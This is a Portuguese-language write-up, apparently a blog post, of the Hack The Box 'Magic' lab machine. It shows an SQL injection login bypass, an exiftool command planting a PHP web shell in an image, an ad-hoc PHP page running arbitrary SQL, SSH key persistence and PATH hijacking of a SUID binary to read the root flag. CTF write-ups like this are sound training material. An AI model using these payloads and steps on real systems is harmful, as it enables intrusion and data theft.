---
layout: post
title: Magic [Hack The Box] - writeup
author: obrerodrigues
categories: [CTFs]
tags: [Hack The Box]
---
Comecei com um scan básicão do nmap como de costume (nmap -v -A 10.10.10.185) e vi isso:

```
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nada me saltou os olhos nesse servidor SSH, então comecei minha busca pela porta 80, o servidor web apache. Nele encontrei o que parecia ser um sisteminha de upload e visualização de imagens. Deixei o gobuster rodando a procura de algum diretório ou arquivo interessante enquanto fui analisando o site na mão. Não parecia ser complexo e o que  chamou a atenção foi o link no canto inferior esquerdo que direcionava para a página de login: http://10.10.10.185/login.php.

O gobuster não achou porra nenhuma, fiquei apenas com essa tela de login como única barreira para conseguir acesso. Tinha uma falha bem boba, coisa que estourou em popularidade lá em 2010 ou antes, sei lá. Ainda assim, demorei para perceber. Analisei requisições usando burp, fucei em código fonte, chutei usuários e senhas (dessa vez eu tentei admin:admin, aprendi a lição com a máquina [traceback](https://brerodrigues.github.io/ctfs/traceback-hack-the-box-write-up)) por um momento até tentei descobrir se havia algo inserido nas imagens usando esteganografia e os caralhos.

Quase travei nessa parte quando, por um acaso, como quem não quer nada, tentei logar usando sql injection. Usei [' or 1=1 --](https://portswigger.net/support/using-sql-injection-to-bypass-authentication) como usuário e senha e fiz o login com sucesso. Um bom e velho momento facepalm.

Logado no sistema me deparo com uma simples página que me dá a opção de fazer upload de uma imagem. Upo uma imagem válida qualquer e verifico que ela vai parar no carrossel de imagens da página principal. Em seguida, tento upar um php malicioso. A essa altura já sabia que o sistema usava php por ter observado a extensão dos arquivos nas urls. Meu upload falhou porque o sistema valida se o arquivo é uma imagem.

Existem variadas formas de se burlar proteções de upload. Vai depender de que tipo de proteção o sistema tem. Por exemplo, checar a extensão do arquivo ou seus headers. Primeiro tentei upar um arquivo php com a extensão de uma imagem, o que não funcionou, depois tentei algumas extensões php, tipo phtml, php3, php4, php5 e ainda assim não tive sucesso. Dei uma pesquisada no google para refrescar a memória e encontrei esse link [https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html](https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html). Então usei o truque do exiftool para adicionar código php como um comentário em uma imagem jpeg: 

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' bbb.php.jpeg
```

e fiz o upload com sucesso. Para testar se tinha dado certo acessei a url: http://10.10.10.185/images/uploads/bbb.php.jpeg?cmd=ls passando o comando ls para ser executado e vi a listagem de arquivos do diretório upload do sistema ser exibida. Execução de código obtida.

Feito isso, tratei de obter uma shell. [Existem maneiras variadas de se fazer isso](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), basta poder executar código no sistema.

Cai na shell como o usuário www-data, o usuário do apache que não tem muitas permissões, nem mesmo a de ler na /home a flag do user. O próximo passo seria escalar privilégios para pegar o usuário theseus, que foi o único nome que descobri quando mandei um ls em /home e um cat em /etc/passwd.

Há um tempo venho tentando ownar as máquinas no htb, por isso a gente acaba pegando o jeito de onde provavelmente as coisas estão. Foi assim que resolvi dar uma olhada nos arquivos do servidor web localizados, tradicionalmente, em /var/www/. Foi lá que, lendo o código fonte do sitezinho de upload de imagens, descobri no arquivo /var/www/Magic/db.php5 as credenciais para o banco de dados:

```
www-data@ubuntu:/var/www/Magic$ cat /var/www/Magic/db.php5
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
    [...]
```

Hum. Poderia ser a senha do usuário? Quem não gosta de reutilizar a mesma senha em todo lugar? Economizar espaço na memória cerebral?

Tentei logar usando o comando su -l theseus e inserindo essa senha mas não dei sorte. Theseus era um cara esperto.

Esse foi um dos momentos que me enrolei sem necessidade, para variar. Tudo porque a máquina não dispunha do cliente de linha de comando [mysql](https://dev.mysql.com/doc/refman/8.0/en/mysql.html). Descobri que não sabia como me conectar ao banco sem ele. Tentei usando as ferramentas que haviam na máquina, como o [mysqladmin](https://dev.mysql.com/doc/refman/8.0/en/mysqladmin.html) mas não fui longe. Não sabia da existência dessas outras ferramentas, então passei um tempo lendo manuais e divagando sobre formas de ler o banco. Sim, falhei em perceber que existia o mysqldump e que ele, provavelmente, me deixaria ler as informações das tabelas. Foi quando tive que recorrer a criatividade, também conhecida como gambiarra.

Me perguntei: qual seria a outra forma de me conectar ao banco sql? Rapidamente me veio a mente usar PHP. A página de login fazia isso. Bastou copiar, colar, apagar boa parte e alterar um pedaço. Criei um rascunho de cliente sql e o salvei na raiz do site como ratf.php:

```
<?php
session_start();
require 'db.php5';
try {
    $pdo = Database::connect();
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_OBJ);
    echo $_GET[cmd];
    $stmt = $pdo->query($_GET[cmd]);
    $user = $stmt->fetch();
    Database::disconnect();
    echo "<pre>";
    print_r ($user);
    } catch (PDOException $e) {
        echo "Error: " . $e->getMessage();
        echo "An SQL Error occurred!";
    }
?>
```

Não me importava com nome de variáveis e boas práticas de programação. O importante era que o negócio funcionava. Pude comprovar quando fiz a seguinte requisição: http://10.10.10.185/ratf.php?cmd=select%20*%20from%20login; e vi o resultado:

```
select * from login;stdClass Object
(
    [id] => 1
    [username] => admin
    [password] => Th3s3usW4sK1ng
)
```

Sabia da existência da tabela de login porque tinha visto o código da página de login. Rodei outros comandos sql para verificar se existia mais alguma outra tabela mas era só isso mesmo. Aquele password para o usuário admin podia ser o de theseus.

E era mesmo:

```
www-data@ubuntu:/$ su -l theseus
su -l theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:~$ cat user.txt	
cat user.txt
031df804509ddfca08c3b4a085f41f63
```

Assim que virei theseus, voltei meus olhos para aquele servidor ssh. Queria uma shellzinha com auto-complete e tal. Botei minha chave ssh nas authorized_keys de theseus e fiquei mais feliz.

```
theseus@ubuntu:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADABABAAABAQDDVokf8pKi0W1dRUl4Ddaz/No//FNwFf4167jNBFin7zu1dKAKi2kkVqNkhw2tWBIvVUwiSZdasdjfklxjczlkj3w4pdkpfx-0zcvizjçsafs0s8HQMLy72HQ5eio8vDpmZvJJ5pRGd0PApERCOzX8cm5k5AyI5QJY/1lXMlYATA8xbqLTVuQm2gO7SypdotQWLMQWM1LG8Ypqakjf7xZ39QUs5+e9iJ++VmII8+G7j8VwLdj4tGuoRjQgwE8st0iMXt+z,xmcarlkasdfamaera brenno@nasa" >> /home/theseus/.ssh/authorized_keys
```

Logando via ssh, comecei a procurar formas de virar root. Dei uma olhada nos arquivos do usuário, processos rodando, bla bla bla. Me rendi e rodei um script, o famosinho linuxprivchecker. O único detalhe foi que tive que correr atrás de uma versão que rodasse em python3, pois na máquina não havia o 2.x. Não foi dificil de encontrar: [https://github.com/swarley7/linuxprivchecker/blob/master/linuxprivchecker.py](https://github.com/swarley7/linuxprivchecker/blob/master/linuxprivchecker.py)

Esses scripts geram um monte de coisa e é fácil de se perder quando o cara não sabe onde olhar. O que, algumas vezes, é o meu caso. Não vi nem de primeira, nem de segunda, e passou batido até numa terceira olhada. Mas depois de um longo período, percebi que havia um binário SUID como root que não era padrão. Era o arquivo: /bin/sysinfo

Acredito que se exige prática pra poder enxergar rápido esses detalhes. O nome não havia chamado minha atenção porque me parecia ser do sistema, sysinfo. Tive que filtrar e comparar com os do meu sistema para perceber que havia algo fora de linha.
Rodando o sysinfo percebi que ele busca e imprime um monte de informações do sistema, tipo assim:

```
====================Hardware Info====================
blablablabla
====================Disk Info====================
blablablalba
====================CPU Info====================
blablablabla
====================MEM Usage=====================
blablabla
```

As informações de saída de sysinfo eram bem parecidas com a saída que os comandos do sistema dão. Era possível que sysinfo estivesse chamando essa galera? Talvez fazendo isso de forma não apropriada? A ideia me pareceu ter potencial. Alguma engenharia reversa nesse cara seria preciso para comprovar essa tese.
Comecei usando a ferramenta de engenharia reversa perfeita e ideal que é o comando strings. Em meio a um monte de informação que não interessava, eis que surge algo que podia ajudar:

```
theseus@ubuntu:/dev/shm$ strings /bin/sysinfo 
/lib64/ld-linux-x86-64.so.2
libstdc++.so.6
__gmon_start__

[...]

GLIBC_2.2.5
%z! 
AWAVI
AUATL
[]A\A]A^A_
popen() failed!
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h
;*3$"
zPLR
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux

[...]

.data
.bss
.comment
```

Será mesmo que o programa chamava os comandos assim? Sem passar o caminho do arquivo? Isso é um perigo. Faz com que o binário do programa seja procurando na variável de ambiente $PATH. Por padrão, nessa varíavel vai estar os caminhos de /usr/bin, /bin e outros caminhos conhecidos para programas do sistema. Você pode ler a sua usando o comando echo $PATH. Mas, como é o que faz sentido, o linux vai procurar o arquivo na ordem que estiverem as opções em $PATH. Tipo, no exemplo que dei, primeiro ele iria verificar em /usr/bin e, caso não encontre, vai buscar em /bin. O perigo mora no fato de que podemos alterar essa variável do jeito que quisermos. Então, caso sysinfo realmente não tivesse tomado esse cuidado, eu poderia adicionar um caminho arbitrário no ínicio de $PATH e colocar um lshw, ou fdisk, ou cat ou free malicioso.

E foi exatamente o que fiz porque fazer a engenharia reversa apropriada iria demorar mais do que testar essa teoria. Primeiro criei um simples bash script que iria ler a flag do root e o chamei de free. Com chmod o dei permissão de executável. Usando export PATH=/dev/shm:$PATH, eu altero o valor da variável $PATH para incluir o caminho do meu diretório /dev/shm na frente de todos outros restantes. Assim, quando sysinfo chamasse free, ia encontrar meu script e ia executa-lo com permissões de root.

```
theseus@ubuntu:/dev/shm$ echo "cat /root/root.txt" > free
theseus@ubuntu:/dev/shm$ chmod +x free 
theseus@ubuntu:/dev/shm$ export PATH=/dev/shm:$PATH
theseus@ubuntu:/dev/shm$ sysinfo
====================Hardware Info====================
H/W path           Device      Class      Description
=====================================================
                               system     VMware Virtual Platform
/0                             bus        440BX Desktop Reference Platform
/0/0                           memory     86KiB BIOS
[...]

====================Disk Info====================
Disk /dev/loop0: 3.7 MiB, 3862528 bytes, 7544 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

[...]

====================CPU Info====================
processor	: 0
[...]


====================MEM Usage=====================
fcef518fe807b4bdf55204e9e75f93ca
```

E ao invés das informações sobre o uso de memória na máquina eu obtive a flag root: fcef518fe807b4bdf55204e9e75f93ca
